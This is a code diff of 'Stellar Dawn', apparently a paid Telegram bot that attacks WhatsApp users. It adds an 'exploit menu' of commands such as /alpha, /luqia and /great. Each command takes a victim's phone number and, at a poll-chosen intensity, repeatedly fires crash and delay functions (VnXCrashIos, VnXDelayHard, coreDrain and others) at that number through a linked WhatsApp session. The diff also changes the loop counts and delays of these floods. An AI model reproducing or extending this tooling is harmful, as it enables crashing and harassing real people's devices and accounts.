@@ -765,8 +765,12 @@ bot.on("callback_query", async (callbackQuery) => {
 Stellar Dawn — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. 
 Stellar Dawn также имеет новейшие и качественные функции. 
 ────────────────────────
-# ☇ 𝘌𝘟𝘗𝘓𝘖𝘐𝘛 - 𝘔𝘌𝘕𝘜
+<pre># ☇ 𝘌𝘟𝘗𝘓𝘖𝘐𝘛 - 𝘔𝘌𝘕𝘜</pre>
 /nezha - Crash Attack
+/alpha - Delay Hard
+/luqia  - Forceclose Ios
+/great  - Delay Ui
+/xethe - Blank x Delay Bulldozer
 /khair - Delay Strike
             `;
             newButtons = [
@@ -774,12 +778,12 @@ Stellar Dawn также имеет новейшие и качественные 
                 [
                     
                 { text: "НАЗАД", callback_data: "mainmenu" },
-                                 { text: "НАЗАД", callback_data: "v2", style: "danger" }
+                                 { text: "➡️", callback_data: "v2", style: "danger" }
                 ], 
             ];
         } else if (data === "v2") {
             newCaption = `
-<pre> ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
+<pre>( ⚠️) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
 Stellar Dawn — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. 
 Stellar Dawn также имеет новейшие и качественные функции. 
 ─────────────────────────
@@ -798,7 +802,7 @@ Stellar Dawn также имеет новейшие и качественные 
             ];
         } else if (data === "ownermenu") {
             newCaption = `
-<pre> ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
+<pre>( ⚠️ ) ＳＴＥＬＬＡＲ - ＤＡＷＮ</pre>
 Stellar Dawn — самая рекомендуемая база для ботов. С элегантным дизайном от SonKairn. 
 Stellar Dawn также имеет новейшие и качественные функции. 
 ─────────────────────────
@@ -1055,30 +1059,511 @@ bot.on('poll_answer', async (pollAnswer) => {
         const target = `${pollData.targetNumber}@s.whatsapp.net`;
 
         if (action === '30%') {
-            for (let i = 0; i < 20; i++) {
+            for (let i = 0; i < 5; i++) {
                 await coreDrain(sock, target);
-                await sleep(200);
+                await sleep(500);
                 await coreDrain(sock, target);
-                await sleep(200);
+                await sleep(500);
             }
         } else if (action === '50%') {
-            for (let i = 0; i < 40; i++) {
+            for (let i = 0; i < 15; i++) {
                 await coreDrain(sock, target);
-                await sleep(200);
+                await sleep(500);
                 await coreDrain(sock, target);
-                await sleep(200);
+                await sleep(500);
                 await coreDrain(sock, target);
-                await sleep(200);
+                await sleep(500);
             }
         }
         else if (action === '70%') {
-            for (let i = 0; i < 60; i++) {
+            for (let i = 0; i < 20; i++) {
                 await coreDrain(sock, target);
-                await sleep(200);
+                await sleep(500);
                 await coreDrain(sock, target);
-                await sleep(200);
+                await sleep(500);
                 await coreDrain(sock, target);
-                await sleep(200);
+                await sleep(500);
+                }
+                }
+
+        await bot.editMessageCaption(
+            `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${pollData.targetNumber}
+│─ Rasio  : ${action.toUpperCase()}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ✅ 𝖲𝗎𝖼𝖼𝖾𝗌𝗌
+│─ Date   : ${pollData.date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: pollData.chatId,
+                message_id: pollData.videoMessageId,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
+                }
+            }
+        );
+
+    } catch (err) {
+        await bot.editMessageCaption(
+            `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${pollData.targetNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖦𝖺𝗀𝖺𝗅
+│─ Error  : ${err.message}
+│─ Date   : ${pollData.date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: pollData.chatId,
+                message_id: pollData.videoMessageId,
+                parse_mode: "HTML"
+            }
+        );
+    }
+
+    activePolls.delete(pollId);
+});
+bot.onText(/\/alpha(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+
+    if (!match || !match[1]) {
+        return bot.sendMessage(chatId, 
+            `❌ *Format salah!*\n\nGunakan: /nezha [nomor]\nContoh: /nezha 628888888888`,
+            { parse_mode: "Markdown" }
+        );
+    }
+
+    const targetNumber = match[1];
+    const randomImage = getRandomImage();
+    const date = getCurrentDate();
+    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
+    const target = `${formattedNumber}@s.whatsapp.net`;
+    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());
+
+    if (!isUserPremium) {
+        return bot.sendPhoto(chatId, randomImage, {
+            caption: `<blockquote>(本) 𝖲𝗍𝖾𝗅𝗅𝖺𝗋 - Dawn</blockquote>\n❌ Akses ditolak. Fitur ini hanya untuk user premium.`,
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [[{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]]
+            }
+        });
+    }
+
+    if (sessions.size === 0) {
+        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
+    }
+
+    const imageMsg = await bot.sendPhoto(chatId, randomImage, {
+        caption: `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${formattedNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⏳ 𝖬𝖾𝗇𝗎𝗇𝗀𝗀𝗎 𝖯𝗂𝗅𝗂𝗁𝖺𝗇
+│─ Date   : ${date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+        `,
+        parse_mode: "HTML"
+    });
+
+    const pollMessage = await bot.sendPoll(chatId, 
+        `ПОЖАЛУЙСТА, ВЫБЕРИТЕ`,
+        ['30%', '50%', '70%'],
+        {
+            is_anonymous: false,
+            allows_multiple_answers: false,
+            reply_to_message_id: imageMsg.message_id,
+            open_period: 60
+        }
+    );
+
+    activePolls.set(pollMessage.poll.id, {
+        chatId,
+        userId,
+        targetNumber: formattedNumber,
+        target,
+        videoMessageId: imageMsg.message_id,
+        pollMessageId: pollMessage.message_id,
+        pollId: pollMessage.poll.id,
+        date,
+        randomImage
+    });
+
+    setTimeout(async () => {
+        try {
+            if (!activePolls.has(pollMessage.poll.id)) return;
+            await bot.deleteMessage(chatId, pollMessage.message_id);
+            await bot.editMessageCaption(
+                `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${formattedNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⌛ 𝖤𝗑𝗉𝗂𝗋𝖾𝖽
+│─ Date   : ${date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+                `,
+                {
+                    chat_id: chatId,
+                    message_id: imageMsg.message_id,
+                    parse_mode: "HTML"
+                }
+            );
+            activePolls.delete(pollMessage.poll.id);
+        } catch (err) {
+            console.log('Error cleanup poll:', err);
+        }
+    }, 60000);
+});
+
+bot.on('poll_answer', async (pollAnswer) => {
+    const pollId = pollAnswer.poll_id;
+    const userId = pollAnswer.user.id;
+    const selectedOptions = pollAnswer.option_ids;
+
+    const pollData = activePolls.get(pollId);
+    if (!pollData) return;
+
+    if (userId !== pollData.userId) {
+        return bot.sendMessage(pollData.chatId, 
+            `⚠️ @${pollAnswer.user.username} — 𝖧𝖺𝗇𝗒𝖺 𝗎𝗇𝗍𝗎𝗄 𝗎𝗌𝖾𝗋 𝗒𝖺𝗇𝗀 𝗋𝖾𝗊𝗎𝖾𝗌𝗍!`
+        );
+    }
+
+    const optionId = selectedOptions[0];
+    let action;
+    switch(optionId) {
+        case 0: action = '30%'; break;
+        case 1: action = '50%'; break;
+        case 2: action = '70%'; break;
+        default: return;
+    }
+
+    try { await bot.deleteMessage(pollData.chatId, pollData.pollMessageId); } 
+    catch (err) { console.log('Error deleting poll:', err); }
+
+    if (action === 'cancel') {
+        await bot.editMessageCaption(
+            `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${pollData.targetNumber}
+│─ Rasio  : ${action.toUpperCase()}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖡𝖺𝗍𝖺𝗅
+│─ Date   : ${pollData.date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: pollData.chatId,
+                message_id: pollData.videoMessageId,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
+                }
+            }
+        );
+        activePolls.delete(pollId);
+        return;
+    }
+
+    await bot.editMessageCaption(
+        `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${pollData.targetNumber}
+│─ Rasio   : ${action.toUpperCase()}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
+│─ Date   : ${pollData.date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+        `,
+        {
+            chat_id: pollData.chatId,
+            message_id: pollData.videoMessageId,
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
+            }
+        }
+    );
+
+    try {
+        const sock = sessions.values().next().value;
+        const target = `${pollData.targetNumber}@s.whatsapp.net`;
+
+        if (action === '30%') {
+            for (let i = 0; i < 5; i++) {
+                await VnXDelayHard(sock, target, ptcp = true);
+                await sleep(500);
+                await VnXDelayHard(sock, target, ptcp = true);
+                await sleep(500);
+            }
+        } else if (action === '50%') {
+            for (let i = 0; i < 15; i++) {
+                await VnXDelayHard(sock, target, ptcp = true);
+                await sleep(500);
+await VnXDelayHard(sock, target, ptcp = true);
+                await sleep(500);
+                
+            }
+        }
+        else if (action === '70%') {
+            for (let i = 0; i < 20; i++) {
+await VnXDelayHard(sock, target, ptcp = true);
+                await sleep(500);
+                await VnXDelayHard(sock, target, ptcp = true);
+                await sleep(500);
+               
+                }
+                }
+
+        await bot.editMessageCaption(
+            `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${pollData.targetNumber}
+│─ Rasio  : ${action.toUpperCase()}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ✅ 𝖲𝗎𝖼𝖼𝖾𝗌𝗌
+│─ Date   : ${pollData.date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: pollData.chatId,
+                message_id: pollData.videoMessageId,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
+                }
+            }
+        );
+
+    } catch (err) {
+        await bot.editMessageCaption(
+            `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${pollData.targetNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖦𝖺𝗀𝖺𝗅
+│─ Error  : ${err.message}
+│─ Date   : ${pollData.date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: pollData.chatId,
+                message_id: pollData.videoMessageId,
+                parse_mode: "HTML"
+            }
+        );
+    }
+
+    activePolls.delete(pollId);
+});
+bot.onText(/\/luqia(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+
+    if (!match || !match[1]) {
+        return bot.sendMessage(chatId, 
+            `❌ *Format salah!*\n\nGunakan: /nezha [nomor]\nContoh: /nezha 628888888888`,
+            { parse_mode: "Markdown" }
+        );
+    }
+
+    const targetNumber = match[1];
+    const randomImage = getRandomImage();
+    const date = getCurrentDate();
+    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
+    const target = `${formattedNumber}@s.whatsapp.net`;
+    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());
+
+    if (!isUserPremium) {
+        return bot.sendPhoto(chatId, randomImage, {
+            caption: `<blockquote>(本) 𝖲𝗍𝖾𝗅𝗅𝖺𝗋 - Dawn</blockquote>\n❌ Akses ditolak. Fitur ini hanya untuk user premium.`,
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [[{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]]
+            }
+        });
+    }
+
+    if (sessions.size === 0) {
+        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
+    }
+
+    const imageMsg = await bot.sendPhoto(chatId, randomImage, {
+        caption: `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${formattedNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⏳ 𝖬𝖾𝗇𝗎𝗇𝗀𝗀𝗎 𝖯𝗂𝗅𝗂𝗁𝖺𝗇
+│─ Date   : ${date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+        `,
+        parse_mode: "HTML"
+    });
+
+    const pollMessage = await bot.sendPoll(chatId, 
+        `ПОЖАЛУЙСТА, ВЫБЕРИТЕ`,
+        ['30%', '50%', '70%'],
+        {
+            is_anonymous: false,
+            allows_multiple_answers: false,
+            reply_to_message_id: imageMsg.message_id,
+            open_period: 60
+        }
+    );
+
+    activePolls.set(pollMessage.poll.id, {
+        chatId,
+        userId,
+        targetNumber: formattedNumber,
+        target,
+        videoMessageId: imageMsg.message_id,
+        pollMessageId: pollMessage.message_id,
+        pollId: pollMessage.poll.id,
+        date,
+        randomImage
+    });
+
+    setTimeout(async () => {
+        try {
+            if (!activePolls.has(pollMessage.poll.id)) return;
+            await bot.deleteMessage(chatId, pollMessage.message_id);
+            await bot.editMessageCaption(
+                `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${formattedNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⌛ 𝖤𝗑𝗉𝗂𝗋𝖾𝖽
+│─ Date   : ${date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+                `,
+                {
+                    chat_id: chatId,
+                    message_id: imageMsg.message_id,
+                    parse_mode: "HTML"
+                }
+            );
+            activePolls.delete(pollMessage.poll.id);
+        } catch (err) {
+            console.log('Error cleanup poll:', err);
+        }
+    }, 60000);
+});
+
+bot.on('poll_answer', async (pollAnswer) => {
+    const pollId = pollAnswer.poll_id;
+    const userId = pollAnswer.user.id;
+    const selectedOptions = pollAnswer.option_ids;
+
+    const pollData = activePolls.get(pollId);
+    if (!pollData) return;
+
+    if (userId !== pollData.userId) {
+        return bot.sendMessage(pollData.chatId, 
+            `⚠️ @${pollAnswer.user.username} — 𝖧𝖺𝗇𝗒𝖺 𝗎𝗇𝗍𝗎𝗄 𝗎𝗌𝖾𝗋 𝗒𝖺𝗇𝗀 𝗋𝖾𝗊𝗎𝖾𝗌𝗍!`
+        );
+    }
+
+    const optionId = selectedOptions[0];
+    let action;
+    switch(optionId) {
+        case 0: action = '30%'; break;
+        case 1: action = '50%'; break;
+        case 2: action = '70%'; break;
+        default: return;
+    }
+
+    try { await bot.deleteMessage(pollData.chatId, pollData.pollMessageId); } 
+    catch (err) { console.log('Error deleting poll:', err); }
+
+    if (action === 'cancel') {
+        await bot.editMessageCaption(
+            `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${pollData.targetNumber}
+│─ Rasio  : ${action.toUpperCase()}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖡𝖺𝗍𝖺𝗅
+│─ Date   : ${pollData.date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: pollData.chatId,
+                message_id: pollData.videoMessageId,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
+                }
+            }
+        );
+        activePolls.delete(pollId);
+        return;
+    }
+
+    await bot.editMessageCaption(
+        `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${pollData.targetNumber}
+│─ Rasio   : ${action.toUpperCase()}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
+│─ Date   : ${pollData.date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+        `,
+        {
+            chat_id: pollData.chatId,
+            message_id: pollData.videoMessageId,
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
+            }
+        }
+    );
+
+    try {
+        const sock = sessions.values().next().value;
+        const target = `${pollData.targetNumber}@s.whatsapp.net`;
+
+        if (action === '30%') {
+            for (let i = 0; i < 5; i++) {
+                await VnXCrashIos(sock, target);
+                await sleep(500);
+                await VnXCrashIos(sock, target);
+                await sleep(500);
+            }
+        } else if (action === '50%') {
+            for (let i = 0; i < 15; i++) {
+                await VnXCrashIos(sock, target);
+                await sleep(500);
+                await VnXCrashIos(sock, target);
+                await sleep(500);
+                
+            }
+        }
+        else if (action === '70%') {
+            for (let i = 0; i < 20; i++) {
+                await VnXCrashIos(sock, target);
+                await sleep(500);
+                await VnXCrashIos(sock, target);
+                await sleep(500);
+                await coreDrain(sock, target);
+                await sleep(500);
                 }
                 }
 
@@ -1298,30 +1783,510 @@ bot.on('poll_answer', async (pollAnswer) => {
         const target = `${pollData.targetNumber}@s.whatsapp.net`;
 
         if (action === '30%') {
-            for (let i = 0; i < 20; i++) {
+            for (let i = 0; i < 5; i++) {
                 await DelayXburn(sock, target);
-                await sleep(200);
+                await sleep(500);
                   await DelayXburn(sock, target);
-                await sleep(200);
+                await sleep(500);
             }
         } else if (action === '50%') {
-            for (let i = 0; i < 40; i++) {
+            for (let i = 0; i < 15; i++) {
                   await DelayXburn(sock, target);
-                await sleep(200);
+                await sleep(500);
                   await DelayXburn(sock, target);
-                await sleep(200);
+                await sleep(500);
                   await DelayXburn(sock, target);
-                await sleep(200);
+                await sleep(500);
             }
         }
         else if (action === '70%') {
-            for (let i = 0; i < 60; i++) {
+            for (let i = 0; i < 20; i++) {
                   await DelayXburn(sock, target);
-                await sleep(200);
+                await sleep(500);
                   await DelayXburn(sock, target);
-                await sleep(200);
+                await sleep(500);
                   await DelayXburn(sock, target);
-                await sleep(200);
+                await sleep(500);
+                }
+                }
+
+        await bot.editMessageCaption(
+            `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${pollData.targetNumber}
+│─ Rasio  : ${action.toUpperCase()}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ✅ 𝖲𝗎𝖼𝖼𝖾𝗌𝗌
+│─ Date   : ${pollData.date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: pollData.chatId,
+                message_id: pollData.videoMessageId,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
+                }
+            }
+        );
+
+    } catch (err) {
+        await bot.editMessageCaption(
+            `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${pollData.targetNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖦𝖺𝗀𝖺𝗅
+│─ Error  : ${err.message}
+│─ Date   : ${pollData.date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: pollData.chatId,
+                message_id: pollData.videoMessageId,
+                parse_mode: "HTML"
+            }
+        );
+    }
+
+    activePolls.delete(pollId);
+});
+bot.onText(/\/great(?:\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+
+    if (!match || !match[1]) {
+        return bot.sendMessage(chatId, 
+            `❌ *Format salah!*\n\nGunakan: /nezha [nomor]\nContoh: /nezha 628888888888`,
+            { parse_mode: "Markdown" }
+        );
+    }
+
+    const targetNumber = match[1];
+    const randomImage = getRandomImage();
+    const date = getCurrentDate();
+    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
+    const target = `${formattedNumber}@s.whatsapp.net`;
+    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());
+
+    if (!isUserPremium) {
+        return bot.sendPhoto(chatId, randomImage, {
+            caption: `<blockquote>(本) 𝖲𝗍𝖾𝗅𝗅𝖺𝗋 - Dawn</blockquote>\n❌ Akses ditolak. Fitur ini hanya untuk user premium.`,
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [[{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]]
+            }
+        });
+    }
+
+    if (sessions.size === 0) {
+        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
+    }
+
+    const imageMsg = await bot.sendPhoto(chatId, randomImage, {
+        caption: `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${formattedNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⏳ 𝖬𝖾𝗇𝗎𝗇𝗀𝗀𝗎 𝖯𝗂𝗅𝗂𝗁𝖺𝗇
+│─ Date   : ${date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+        `,
+        parse_mode: "HTML"
+    });
+
+    const pollMessage = await bot.sendPoll(chatId, 
+        `ПОЖАЛУЙСТА, ВЫБЕРИТЕ`,
+        ['30%', '50%', '70%'],
+        {
+            is_anonymous: false,
+            allows_multiple_answers: false,
+            reply_to_message_id: imageMsg.message_id,
+            open_period: 60
+        }
+    );
+
+    activePolls.set(pollMessage.poll.id, {
+        chatId,
+        userId,
+        targetNumber: formattedNumber,
+        target,
+        videoMessageId: imageMsg.message_id,
+        pollMessageId: pollMessage.message_id,
+        pollId: pollMessage.poll.id,
+        date,
+        randomImage
+    });
+
+    setTimeout(async () => {
+        try {
+            if (!activePolls.has(pollMessage.poll.id)) return;
+            await bot.deleteMessage(chatId, pollMessage.message_id);
+            await bot.editMessageCaption(
+                `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${formattedNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⌛ 𝖤𝗑𝗉𝗂𝗋𝖾𝖽
+│─ Date   : ${date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+                `,
+                {
+                    chat_id: chatId,
+                    message_id: imageMsg.message_id,
+                    parse_mode: "HTML"
+                }
+            );
+            activePolls.delete(pollMessage.poll.id);
+        } catch (err) {
+            console.log('Error cleanup poll:', err);
+        }
+    }, 60000);
+});
+
+bot.on('poll_answer', async (pollAnswer) => {
+    const pollId = pollAnswer.poll_id;
+    const userId = pollAnswer.user.id;
+    const selectedOptions = pollAnswer.option_ids;
+
+    const pollData = activePolls.get(pollId);
+    if (!pollData) return;
+
+    if (userId !== pollData.userId) {
+        return bot.sendMessage(pollData.chatId, 
+            `⚠️ @${pollAnswer.user.username} — 𝖧𝖺𝗇𝗒𝖺 𝗎𝗇𝗍𝗎𝗄 𝗎𝗌𝖾𝗋 𝗒𝖺𝗇𝗀 𝗋𝖾𝗊𝗎𝖾𝗌𝗍!`
+        );
+    }
+
+    const optionId = selectedOptions[0];
+    let action;
+    switch(optionId) {
+        case 0: action = '30%'; break;
+        case 1: action = '50%'; break;
+        case 2: action = '70%'; break;
+        default: return;
+    }
+
+    try { await bot.deleteMessage(pollData.chatId, pollData.pollMessageId); } 
+    catch (err) { console.log('Error deleting poll:', err); }
+
+    if (action === 'cancel') {
+        await bot.editMessageCaption(
+            `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${pollData.targetNumber}
+│─ Rasio  : ${action.toUpperCase()}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖡𝖺𝗍𝖺𝗅
+│─ Date   : ${pollData.date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: pollData.chatId,
+                message_id: pollData.videoMessageId,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
+                }
+            }
+        );
+        activePolls.delete(pollId);
+        return;
+    }
+
+    await bot.editMessageCaption(
+        `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${pollData.targetNumber}
+│─ Rasio   : ${action.toUpperCase()}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
+│─ Date   : ${pollData.date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+        `,
+        {
+            chat_id: pollData.chatId,
+            message_id: pollData.videoMessageId,
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
+            }
+        }
+    );
+
+    try {
+        const sock = sessions.values().next().value;
+        const target = `${pollData.targetNumber}@s.whatsapp.net`;
+
+        if (action === '30%') {
+            for (let i = 0; i < 5; i++) {
+                await RvXDelayui(sock, target);
+                await sleep(500);
+                await RvXDelayui(sock, target);
+                await sleep(500);
+            }
+        } else if (action === '50%') {
+            for (let i = 0; i < 15; i++) {
+                await RvXDelayui(sock, target);
+                await sleep(500);
+                await RvXDelayui(sock, target);
+                await sleep(500);
+                
+            }
+        }
+        else if (action === '70%') {
+            for (let i = 0; i < 20; i++) {
+                await RvXDelayui(sock, target);
+                await sleep(500);
+                await RvXDelayui(sock, target);
+                await sleep(500);
+                
+                }
+                }
+
+        await bot.editMessageCaption(
+            `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${pollData.targetNumber}
+│─ Rasio  : ${action.toUpperCase()}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ✅ 𝖲𝗎𝖼𝖼𝖾𝗌𝗌
+│─ Date   : ${pollData.date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: pollData.chatId,
+                message_id: pollData.videoMessageId,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
+                }
+            }
+        );
+
+    } catch (err) {
+        await bot.editMessageCaption(
+            `
+<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
+┌────────────────────────┐
+│─ Target : ${pollData.targetNumber}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖦𝖺𝗀𝖺𝗅
+│─ Error  : ${err.message}
+│─ Date   : ${pollData.date}
+└────────────────────────┘
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: pollData.chatId,
+                message_id: pollData.videoMessageId,
+                parse_mode: "HTML"
+            }
+        );
+    }
+
